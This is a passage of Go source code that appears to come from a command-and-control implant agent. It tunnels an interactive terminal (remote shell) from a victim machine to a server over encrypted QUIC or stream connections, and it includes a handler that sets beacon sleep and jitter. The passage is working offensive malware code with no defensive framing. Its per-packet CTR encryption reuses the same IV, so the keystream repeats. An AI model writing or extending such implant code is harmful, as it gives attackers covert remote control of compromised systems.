					_ = process.Process.Kill()
				}
				_ = srvConn.Close()
			})
		}

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			if profile.Protocol == "quic" {
				// Framed Reader for QUIC: Conn -> Pty
				for {
					encData, err := functions.RecvMsg(srvConn)
					if err != nil {
						break
					}
					if len(encData) > 0 {
						// Stateless Decrypt: Reset CTR for each packet
						decData := make([]byte, len(encData))
						localDecStream := cipher.NewCTR(decCipher, tunIv)
						localDecStream.XORKeyStream(decData, encData)

						if rw, ok := ptyProc.(io.ReadWriter); ok {
							_, err = rw.Write(decData)
						} else {
							break
						}
						
						if err != nil {
							fmt.Printf("[DEBUG] Reader Loop Error (Write to PTY): %v\n", err)
							break
						}
					}
				}
			} else {
				functions.RelayConnToPty(ptyProc, streamReader)
			}
			closeAll()
		}()

		go func() {
			defer wg.Done()
			if profile.Protocol == "quic" {
				// Framed Writer for QUIC: Pty -> Conn
				buf := make([]byte, 8192)

				// Send initial packet with Newline to kickstart connection
				fmt.Printf("[DEBUG] Starting Terminal Program: '%s' Size: %dx%d\n", params.Program, params.Width, params.Height)
				fmt.Println("[DEBUG] Starting Terminal Init...")
				
				// Encrypt payload to maintain stream cipher state sync
				initPayload := []byte("\n")
				encInitPayload := make([]byte, len(initPayload))
				
				// Stateless Encrypt
				localEncStream := cipher.NewCTR(encCipher, tunIv)
				localEncStream.XORKeyStream(encInitPayload, initPayload)

				initTermPack := utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: true, Data: encInitPayload}
				initTpData, _ := msgpack.Marshal(initTermPack)
				initStartMsg := utils.StartMsg{Type: utils.JOB_TERMINAL, Data: initTpData}
				initSmData, _ := msgpack.Marshal(initStartMsg)
				
				// Re-enable Transport Encryption to match global state
				initFinalData, errEnc := utils.EncryptData(initSmData, utils.SKey)
				if errEnc == nil {
					if errSend := functions.SendMsg(srvConn, initFinalData); errSend == nil {
						fmt.Println("[DEBUG] Init packet sent successfully (Encrypted)")
					} else {
						fmt.Printf("[DEBUG] Failed to send init packet: %v\n", errSend)
					}
				} else {
					fmt.Printf("[DEBUG] Failed to encrypt init packet: %v\n", errEnc)
				}
				time.Sleep(100 * time.Millisecond)

				for {
					var n int
					if rw, ok := ptyProc.(io.ReadWriter); ok {
						n, err = rw.Read(buf)
					} else {
						break
					}
					
					if n > 0 {
						encData := make([]byte, n)
						
						// Stateless Encrypt: Reset CTR for each packet
						localEncStream := cipher.NewCTR(encCipher, tunIv)
						localEncStream.XORKeyStream(encData, buf[:n])

						termPack := utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: true, Data: encData}
						tpData, _ := msgpack.Marshal(termPack)

						startMsg := utils.StartMsg{Type: utils.JOB_TERMINAL, Data: tpData}
						smData, _ := msgpack.Marshal(startMsg)
						
						// Encrypt with Session Key
						finalData, _ := utils.EncryptData(smData, encKey)

						err = functions.SendMsg(srvConn, finalData)
						if err != nil {
							break
						}
					}
					if err != nil {
						if err != io.EOF {
							fmt.Printf("[DEBUG] Writer Loop Error (PTY Read/Send): %v\n", err)
						} else {
							fmt.Println("[DEBUG] Writer Loop: PTY Closed (EOF)")
						}
						break
					}
				}
			} else {
				functions.RelayPtyToConn(streamWriter, ptyProc)
			}
			closeAll()
		}()

		go func() {
			<-ctx.Done()
			closeAll()
		}()

		wg.Wait()
		_ = process.Wait()
		cancel()
	}()
}
func taskSleep(paramsData []byte) ([]byte, error) {
	var params utils.ParamsSleep
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	profile.Sleep = params.Sleep
	profile.Jitter = params.Jitter

	return nil, nil
}
